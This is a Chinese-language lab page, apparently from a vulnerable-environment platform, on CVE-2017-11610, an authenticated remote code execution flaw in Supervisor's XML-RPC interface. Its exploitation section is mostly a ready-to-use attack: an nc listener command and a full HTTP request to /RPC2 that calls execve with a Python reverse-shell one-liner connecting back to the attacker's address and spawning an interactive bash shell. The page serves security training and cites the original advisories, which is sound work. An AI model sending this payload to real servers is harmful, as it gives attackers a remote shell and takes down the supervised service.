# Supervisor Authenticated Remote Code Execution(CVE-2017-11610)

### 漏洞信息

Supervisor 是用 Python 开发的一套通用的进程管理程序，能将一个普通的命令行进程变为后台 daemon，并监控进程状态，异常退出时能自动重启。Supervisor可通过web接口管理服务，在配置了web接口后，同时会在服务器启动一个 XMLRPC 服务器，端口为 9001。该接口可配置需要密码访问，或者无需认证访问。

在获取该接口的访问权限后，远程攻击者可发送一段精心构造的请求，可在服务器执行任意代码。

详细信息参考：[[CVE-2017-11610] RCE vulnerability report](https://github.com/Supervisor/supervisor/issues/964)


### 漏洞利用

**注意：**该 Exp 使用的`execve`, 如果存在漏洞，会将 `supervisord` 进程替换成指定的程序(本 Exp 中将会替换成 `/usr/bin/python`)，换言之，会导致`supervisord`进程退出，**生产环境中请慎用**

反弹 Shell 演示：

> 假定启动后的环境如下：
>
> 攻击者 IP: {{remoteip}}
> 
> 受害者 IP: {{ip}}

1. 在攻击者机器上使用 nc 监听

 ```
 $ nc -lvp 9999
 ```

2. 向受害者 {{port[1]}} 端口发送如下报文后即可

```
POST /RPC2 HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/xml
Content-Type: text/xml
Accept-Language: en-GB,en;q=0.5
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Length: 638
Host: {{ip}}:{{port[1]}}

<?xml version="1.0"?>
<methodCall>
<methodName>supervisor.supervisord.options.execve</methodName>
<params>
<param>
<string>/usr/bin/python</string>
</param>
<param>
<array>
<data>
<value><string>python</string></value>
<value><string>-c</string></value>
<value><string>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{remoteip}}",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);</string></value>
</data>
</array>
</param>
<param>
<struct>
</struct>
</param>
</params>
</methodCall>
```

---

![](http://{{ip}}:{{webport}}/vuln/supervisor/exp.png)

### 参考链接

* [SSD Advisory – Supervisor Authenticated Remote Code Execution](https://blogs.securiteam.com/index.php/archives/3348)
* [[CVE-2017-11610] RCE vulnerability report](https://github.com/Supervisor/supervisor/issues/964)
